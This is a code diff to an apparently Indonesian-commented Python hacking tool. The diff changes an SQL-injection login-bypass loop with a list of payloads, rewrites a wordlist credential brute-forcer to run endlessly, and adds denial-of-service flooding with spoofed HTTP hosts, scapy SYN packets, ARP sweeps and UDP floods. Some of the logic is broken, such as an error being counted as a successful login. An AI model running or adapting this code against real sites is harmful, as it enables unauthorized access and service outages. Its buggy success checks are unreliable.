@@ -48,6 +48,9 @@ import colorama
 import cloudscraper
 import random
 from colorama import Fore, Back, Style, init
+import threading, socket, random, http.client, scapy.all
+from scapy.all import IP, TCP, sr1, ARP, Ether, srp
+
 global user_ip
 user_ip = Faker()
 ip_addr = user_ip.ipv4()
@@ -629,35 +632,40 @@ elif answer.startswith("6"):
         password = ["' or '1'='1", "' or ''='", "'or string-length(name(.))<10 or'", "admin' or '1'='2", "' or ''^'", "')) or (('x'))=(('x", "admin'or 1=1 or ''='", "admin') or ('1'='1'/*", "' or ''='", "or '='", "==", "') or '1'='1'#", "'oR/**/2/**/oR'", "admin') or '1'='1'--", "admin' or '1'='1", "%bf')Or(1)-- 2", "') UniON SElecT 1,2,3,4,5-- 2", "admin'-- 2", "'=' 'or' and '=' 'or'", "' or username like '%"]
         for nck in nickname:
             for psw in password:
-                login_data = {
-                    'username': nck,
-                    'password': psw
-                }
-                session = requests.Session()
-                print(info + f"Bypassing With Username : {nck}")
-                print(info + f"Password : {psw}")
-                # Kirim permintaan GET untuk membuka halaman login dan mendapatkan cookie
-                response = session.get(login_url)
-                soup = BeautifulSoup(response.text, 'html.parser')
+                try:
+                    login_data = {
+                        'username': nck,
+                        'password': psw
+                    }
+                    session = requests.Session()
+                    print(info + f"Bypassing With Username : {nck}")
+                    print(info + f"Password : {psw}")
+                    # Kirim permintaan GET untuk membuka halaman login dan mendapatkan cookie
+                    response = session.get(login_url)
+                    soup = BeautifulSoup(response.text, 'html.parser')
 
-                # Temukan token CSRF jika diperlukan
-                csrf_token = soup.find('input', {'name': 'csrf_token'})['value'] if soup.find('input', {'name': 'csrf_token'}) else ''
+                    # Temukan token CSRF jika diperlukan
+                    csrf_token = soup.find('input', {'name': 'csrf_token'})['value'] if soup.find('input', {'name': 'csrf_token'}) else ''
  
-                # Tambahkan token CSRF ke data login
-                login_data['csrf_token'] = csrf_token
+                    # Tambahkan token CSRF ke data login
+                    login_data['csrf_token'] = csrf_token
 
-                login_response = session.post(login_url, data=login_data)
+                    login_response = session.post(login_url, data=login_data)
+                    resp = requests.get(login_response)
 
-                 # Periksa apakah login berhasil dengan memeriksa status respons HTTP
-                if login_response.url == True:  # Ubah ini sesuai dengan URL yang menunjukkan login berhasil
-                    print(success + f'Login Successfully With Name : {nickname}')
-                    print('Password : ', password)
-                    login_success = True
+                     # Periksa apakah login berhasil dengan memeriksa status respons HTTP
+                    if 'Dashboard' in resp.text:  # Ubah ini sesuai dengan URL yang menunjukkan login berhasil
+                        print(success + f'Login Successfully With Name : {nck}')
+                        print('Password : ', psw)
+                        login_success = True
 
-                # Pengecekan akhir jika tidak ada yang berhasil login
-                if not login_success:
-                    print(fail + f'Cant login to the website :(.')    
-        
+                    # Pengecekan akhir jika tidak ada yang berhasil login
+                    else:
+                        print(fail + f'Cant login to the website')    
+                except requests.exceptions.InvalidURL:
+                    print(success + f'Login Successfully With Name : {nck}')
+                    print('Password : ', psw)
+                    continue
 elif answer.startswith("7"):
     pass
     pN = phonenumbers.parse(input("Phone Number : "))
@@ -2604,49 +2612,51 @@ elif answer == ("20"):
             files_content_str = files_content
             nick_lines = files_content_str.split()
             password_lines = files_content_str.split()
-            for nick in nick_lines:
-                for password in password_lines:
-                    try:
-                        # Membuat payload untuk data login
-                        payload = {
-                            idu : nick,
-                            idp : password
-                        }
+            while True:
+                for nick in nick_lines:
+                    for password in password_lines:
+                        try:
+                                # Membuat payload untuk data login
+                            payload = {
+                                idu : nick,
+                                idp : password
+                            }
 
-                        # Melakukan permintaan POST untuk login
-                        session = requests.Session()
+                            # Melakukan permintaan POST untuk login
+                            session = requests.Session()
             
-                        print(green + f"---------------------------")
-                        print(info + f"Trying Nick: {nick}")
-                        print(f"Password: {password}")
-                        print(payload)
-                        print(green + f"---------------------------")
-                        response = session.post(login_url, data=payload)
-                        soup = BeautifulSoup(response.text, 'html.parser')
+                            print(green + f"---------------------------")
+                            print(info + f"Trying Nick: {nick}")
+                            print(f"Password: {password}")
+                            print(payload)
+                            print(green + f"---------------------------")
+                            response = session.post(login_url, data=payload)
+                            soup = BeautifulSoup(response.text, 'html.parser')
 
-                        user_data = f'<input type="text" id="{idu}" name="{nmu}">'
-                        pass_data = f'<input type="password" id="{idp}" name="{nmp}">'
-                        yo = user_data + pass_data
-                        response = requests.post(login_url, data=yo, header=yo)
-                        keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' 
-                    
-                        if re.search(keyword, response.text, re.IGNORECASE):
-                                print(success + f'Login Success !')
+                            user_data = f'<input type="text" id="{idu}" name="{nmu}">'
+                            pass_data = f'<input type="password" id="{idp}" name="{nmp}">'
+                            yo = user_data + pass_data
+                            response = requests.post(login_url, data=yo)
+                            keyword = 'Login Success' or 'Dashboard' or 'Welcome' or 'Success' or 'Hi Admin' 
+                            response = requests.post(login_url, data={f'{nmu}': nick})
+                            response = requests.post(login_url, data={f'{nmp}': password})
+                            if re.search(keyword, response.text, re.IGNORECASE):
+                                    print(success + f'Login Success !')
+                                    print(response)
+                                    def log(login_url):
+                                       file = open((login_url) + ".txt", "a")
+                                       file.write(str(payload))
+                                       file.write("\n")
+                                       file.close
+                                       file_name = login_url
+                                    log(login_url)
+                            else:
+                                print(fail + f'Login Failed.')
                                 print(response)
-                                def log(login_url):
-                                   file = open((login_url) + ".txt", "a")
-                                   file.write(str(payload))
-                                   file.write("\n")
-                                   file.close
-                                   file_name = login_url
-                                log(login_url)
-                        else:
-                            print(fail + f'Login Failed.')
-                            print(response)
-                    except requests.exceptions.ReadTimeout:
-                        print("Request Timed Out, Please Wait..")
-                        continue
-                print(success + f"[ + ] Done.. [ + ]")
+                        except requests.exceptions.ReadTimeout:
+                            print("Request Timed Out, Please Wait..")
+                            continue
+                    print(success + f"[ + ] Done.. [ + ]")
         except KeyboardInterrupt:
             print("Interrupt")
             exit()
@@ -3548,9 +3558,23 @@ elif answer == ("20"):
                         scraper = cloudscraper.create_scraper(browser='chrome')
                         t = str(ip)
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connect((t,port))
-                        s.send(("GET /"+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n").encode('ascii'))
+                        s.connect((ip,port))
+                        req = "GET / "+ip+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n"
+                        req += "User-Agent: "+random.choice(ua)+"\r\n"
+                        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+                        req += "Connection: Keep-Alive\r\n"
+                        s.send((req).encode('utf-8'))
                         s.sendto(byte,(ip,port))
+                        s.close
+                        chosen_fake = random.choice(fake)
+                        conn = http.client.HTTPConnection(chosen_fake)
+                        conn.request("GET", "/" + ip, headers={"Host": chosen_fake})
+                        global attack
+                        attack += 1
+                        packet = IP(dst=ip) / TCP(dport=port, sport=0x8888, flags="S")
+                        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+                        result, _ = srp(arp_request, timeout=0, verbose=0)
+                        response = sr1(packet, timeout=0, verbose=0)
                         for i in range(bps):
                             udp.sendto(byte, (ip,port))
                             udp.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
@@ -3595,9 +3619,24 @@ elif answer == ("20"):
                         scraper = cloudscraper.create_scraper(browser='chrome')
                         t = str(ip)
                         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        s.connect((t,port))
-                        s.send(("GET /"+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n").encode('ascii'))
+                        s.connect((ip,port))
+                        req = "GET / "+ip+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\n"
+                        req += "User-Agent: "+random.choice(ua)+"\r\n"
+                        req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+                        req += "Connection: Keep-Alive\r\n"
+                        s.send((req).encode('utf-8'))
                         s.sendto(byte,(ip,port))
+                        s.close
+                        chosen_fake = random.choice(fake)
+                        conn = http.client.HTTPConnection(chosen_fake)
+                        conn.request("GET", "/" + ip, headers={"Host": chosen_fake})
+                        global attack
+                        attack += 1
+                        packet = IP(dst=ip) / TCP(dport=port, sport=0x8888, flags="S")
+                        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+                        result, _ = srp(arp_request, timeout=0, verbose=0)
+                        response = sr1(packet, timeout=0, verbose=0)
+                        print(f"ATTACKING SERVER {ip}:{port} Sent :", attack, end='\r')
                         for i in range(bps):
                             udp.sendto(byte, (ip,port))
                             udp.sendto(byte,("GET "+t+" HTTP/1.1\r\nHost: "+random.choice(fake)+"\r\nUser-Agent: "+random.choice(ua)+"\r\n").encode('utf-8'), (ip,port))
